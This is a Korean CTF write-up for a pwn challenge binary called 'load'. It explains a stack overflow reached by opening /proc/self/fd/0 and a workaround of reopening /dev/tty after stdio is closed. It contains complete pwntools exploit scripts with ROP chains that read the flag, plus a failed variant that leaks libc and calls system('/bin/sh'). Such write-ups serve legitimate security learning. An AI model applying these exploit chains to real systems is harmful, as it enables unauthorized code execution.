# index

- [summary](#summary)
- [anaylisis](#anaylisis)
- [exploit](#exploit)
- [의문점](#의문점)
- [망한 익스코드](#망한-익스코드)



# summary

- application file descriptor **(Reopening STDIN)**
- stack remain
- bof rop chain 



# anaylisis

```c
m444ndu@ubuntu:~/round1/load$ checksec load
[*] '/home/m444ndu/round1/load/load'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

카나리가 안걸려 있습니당



### main()

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+0h] [rbp-30h]
  __int64 mode; // [rsp+20h] [rbp-10h]
  __off_t offset1; // [rsp+28h] [rbp-8h]

  initial();
  _printf_chk(1LL, (__int64)"Load file Service\nInput file name: ");
  input(str, 0x80);
  _printf_chk(1LL, (__int64)"Input offset: ");
  offset1 = inputt();
  _printf_chk(1LL, (__int64)"Input size: ");
  mode = inputt();
  file_read(&buf, str, offset1, mode);
  ccclose();
  return 0LL;
}
```

`main()`은 매우 간단한 구조를 가졌습니다. 그냥 전역변수 `str`에 입력을 받고, `offset1`,  `mode`변수들에 입력을 받은 뒤, 해당 값들을 갖고 `file_read()`를 실행합니다. `file_read()`를 실행한 뒤에는 `ccclose()`를 통해 열린 `fd`들을 모두 닫아버립니다..



### file_read()

```c
int __fastcall file_read(void *buf, const char *str, __off_t offset1, __int64 mode)
{
  size_t nbytes; // [rsp+0h] [rbp-30h]
  __off_t offset; // [rsp+8h] [rbp-28h]
  int fd; // [rsp+2Ch] [rbp-4h]

  offset = offset1;
  fd = open(str, 0, mode);
  if ( fd == -1 )
    return puts("You can't read this file...");
  lseek(fd, offset, 0);
  if ( read(fd, buf, nbytes) > 0 )
    puts("Load file complete!");
  return close(fd);
}
```

`file_read()`함수는 그냥 인자로 넘겨받은 값들을 사용하여 파일에 대한 `file descriptor`를 생성하고, `main()`의 `buf`에 해당 `fd`의 데이터를 읽어들입니다. 이 동작은 `read(fd, buf, nbytes)`를 통해 구현되는데, `nbytes`의 경우 이전에 해당 스택 공간을 사용한 `inputt()`에서 `size` 값으로 입력 받은 데이터가 저장되어 있어, `size`를 적당한 값으로 주는게 중요합니다.  

본 문제의 취약점은 위의 함수에서 터집니다. 만약 `fd`를 `stdin`을 나타내는 `0`으로 하거나 유사한 효과를 낼 수 있는 값으로 세팅하여 사용자의 입력이 `buf`에 들어갈 수 있도록 한다면...? 으아닛! **bof**를 일으킬 수 있게됩니다.

열심히 구글링 결과 `/proc/{pid}/fd/0` 파일이 `stdin`에 해당하는 `file descriptor`라는 것을 알게되었습니다. `pid`를 어떻게 해야하나 고민했지만 **'self'**라는게 존재하더군요! 프로그램이 시작한 뒤, **/proc/self/fd/0**은 `stdin`, **/proc/self/fd/1**은 `stdout`, **/proc/self/fd/2**는 `stderr`를 디폴트로 나타냅니다. 

따라서, `open()`함수의 인자로 **/proc/self/fd/0**를 준다면, 결국 사용자의 표준 입력이 `buf`로 입력되게 됩니다. 뇌피셜이긴 하지만 이 `fd 0`를 나타내는 `fd 3`은 `dup()`를 사용하여 `fd`를 복제한 거랑 같은 거라고 생각됩니당



### ccclose()

```c
int ccclose()
{
  close(0);
  close(1);
  return close(2);
}
```

`main()`이 끝날 무렵 불러지는 이녀석은 `표준 입력`, `표준 출력`, `표준 에러`를 모두 닫아버리는 무시무시한 녀석입니다.. `ㅡㅡ` 이녀석때문에 많이 쪼콤 해맷습니다...

`file_read()`  에서 발생한 **bof** 취약점으로 `rip`를 컨트롤한다고 해도, `main()`의 `rip`를 컨트롤할 수 있기 때문에, 위의 함수로 표준 입출력를 닫아버린 상태로 원하는 동작을 실행하게 됩니다.. ~~(적어도 출력은 되야지 플래그라도 보제...)~~

아까처럼 **/proc/self/fd/1**을 하면 된다고 생각할 수도 있지만, 이미 해당 값은 `close()`된 상태이기 때문에 불가능합니다. 그래서 실제 `표준 입력 장치`를 나타내는 파일이나 `표준 입력`을 대체할 수 있는게 없을까하며 열심히 구글링해서 찾은게 바로 터미널을 나타내는 `/dev/tty`입니다. 

터미널로 직접 보내주면 사용자에게 보이겠거니 하고 해봤는데, 다행히 잘 됩니다. `puts()`이나 `printf()`를 통하여 화면에 출력하는 것은 기존의 표준 출력인 `fd 1`을 사용하기 때문에, 그를 대체하기 위해서는 마찬가지로 `fd 1`값으로 `/dev/tty`를 연결해줘야 합니다. 기존 `표준 입출력`들을 `close()`해주었기 때문에 새로 `fd`를 할당받으면 **0**부터 생성됩니다.

위의 사항들을 고려하여 `fd`를 만들어준 뒤, 플래그를 읽어 저장하고 출력해주는 **ROP chain**을 구성해주면 됩니다. `pop rdx;`를 할 수 있는 `gadget`은 없으나 대충 `rdx` 값이 **libc**를 가리켜서 무사히 세번째 인자도 줄 수 있습니다. 그냥 깔끔하게 `stderr`까지 세 개의 기본 `fd` 모두 `/dev/tty`로 만들어 준 뒤 `flag`에 대한 `fd`를 생성하고 `read()`와 `puts()`를 통해 플래그를 읽었습니당 



# exploit

```python
#! /usr/bin/python
from pwn import *

r = process('./load')
context.log_level = 'debug'
gdb.attach(r,'b* 0x000040089D') #0x0400 8a8 966


payload1 = '/proc/self/fd/0' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += './flag' + '\x00'
r.sendlineafter('Input file name: ',payload1)

r.sendlineafter('Input offset: ','0')
r.sendlineafter('Input size: ','400')

string = 0x0601040

payload2 = 'A'*0x38 # dummy
## open('/proc/self/fd/0',0,?)
for i in range(0,3):
	payload2 += p64(0x00400a73) #0x0000000000400a73 : pop rdi ; ret 
	payload2 += p64(string + 0x10 + 0x09*i)
	payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
	payload2 += p64(0x02)
	payload2 += p64(0x00)
	payload2 += p64(0x0400710) # open@plt  rdx is very biggg!

payload2 += p64(0x00400a73) # pop rdi; ret
payload2 += p64(0x060106b) # flag string
payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
payload2 += p64(0x00)
payload2 += p64(0x00)
payload2 += p64(0x0400710) # open@plt  rdx is very biggg!

payload2 += p64(0x00400a73) # pop rdi; ret
payload2 += p64(0x03) # fd 3 
payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
payload2 += p64(0x0601f00) # bss
payload2 += p64(0x00)
payload2 += p64(0x000004006E8) # read@plt

payload2 += p64(0x00400a73) # pop rdi; ret
payload2 += p64(0x0601f00) # bss
payload2 += p64(0x000004006C0) # puts@plt

r.sendline(payload2)

r.interactive()
```



## 의문점

> 사실 입력도 터미널로 대체할 수 있지 않을까 싶어 먼저, libc를 leak하고 return main() 한 뒤, 다시 입력을 받아 system("/bin/sh")를 실행시키는 ROP chain을 구성했었습니다. 그러나 정확한 이유는 모르겠는데 입력의 경우 /dev/tty로는 되는거 같으면서도 불가능했습다..

```c
#include<stdio.h>

int main(){

	int fd;
	char buf[0x30];

	puts("AAAA");
	close(0);
	close(1);
	close(2);

	puts("BBBB");

	fd = open("/dev/tty",2,100); // 0
	printf("fd : %d\n",fd);

	fd = open("/dev/tty",2,100); // 1
	printf("fd : %d\n",fd);

	fd = open("/dev/tty",2,100); // 2
	printf("fd : %d\n",fd);

	printf("leave fd 0, 1, 2\n");
	read(0,buf,0x10);
	puts(buf);

//	fd = open("/proc/self/fd/0",2,0); // 3
//	printf("fd : %d\n",fd);
//	read(fd,buf,0x10);
//	puts(buf);

//	fd = open("/proc/self/fd/1",2,420);
//	printf("fd : %d\n",fd);

//	fd = open("/proc/self/fd/2",2,420);
//	printf("fd : %d\n",fd);

//	fd = open("/dev/stdout",2,100);
//	printf("fd : %d\n",fd);
	
	puts("CCCC");

	return 0;
}
```

```css
m444ndu@ubuntu:~/round1/load$ ./test
AAAA
fd : 1
fd : 2
leave fd 0, 1, 2
asdfsadfasdf
asdfsadfasdf

CCCC
```

위의 코드로 실험을 해봤을 때, 정상적으로 입력이 가능했으나 익스로 하려니 입력에서 이상하게 EOF가 터지는 군여 ㅠㅠ



# 망한 익스코드

```python
#! /usr/bin/python
from pwn import *

r = process('./load')
context.log_level = 'debug'
gdb.attach(r,'b* 0x000040089D') #0x0400 8a8 966


payload1 = '/proc/self/fd/0' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += '/dev/tty' + '\x00'
payload1 += './flag' + '\x00'
r.sendlineafter('Input file name: ',payload1)

r.sendlineafter('Input offset: ','0')
r.sendlineafter('Input size: ','400')

string = 0x0601040

payload2 = 'A'*0x38 # dummy
## open('/proc/self/fd/0',0,)
for i in range(0,3):
	payload2 += p64(0x00400a73) #0x0000000000400a73 : pop rdi ; ret 
	payload2 += p64(string + 0x10 + 0x09*i)
	payload2 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
	payload2 += p64(0x02)
	payload2 += p64(0x00)
	payload2 += p64(0x0400710) # open@plt  rdx is very biggg!

payload2 += p64(0x0000000000400a73) # 0x0000000000400a73 : pop rdi ; ret
payload2 += p64(0x000000600FC8 )# puts@got
payload2 += p64(0x000004006C0) # puts@plt
payload2 += p64(0x00000000400816) # main
r.sendline(payload2)

r.recvuntil('Load file complete!\n')
leak = u64((r.recv(6)).ljust(8,'\x00'))
libc_base = leak - 1012304
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 283536
binsh_addr = libc_base + 1625431
log.info('system_addr = '+hex(system_addr))
log.info('binsh_addr ='+hex(binsh_addr))


r.sendlineafter('Input file name: ',payload1)
r.sendlineafter('Input offset: ','0')
r.sendlineafter('Input size: ','400')


payload3 = 'A'*0x38 # dummy
## open('/proc/self/fd/0',0,)
for i in range(0,3):
	payload3 += p64(0x00400a73) #0x0000000000400a73 : pop rdi ; ret 
	payload3 += p64(string + 0x10 + 0x09*i)
	payload3 += p64(0x0400a71) #0x0400a71 : pop rsi ; pop r15 ; ret
	payload3 += p64(0x02)
	payload3 += p64(0x00)
	payload3 += p64(0x0400710) # open@plt  rdx is very biggg!

payload3 += p64(0x0000000000400a73) # 0x0000000000400a73 : pop rdi ; ret
payload3 += p64(binsh_addr)# /bin/sh
payload3 += p64(system_addr) # system
r.sendline(payload3)

r.interactive()
```
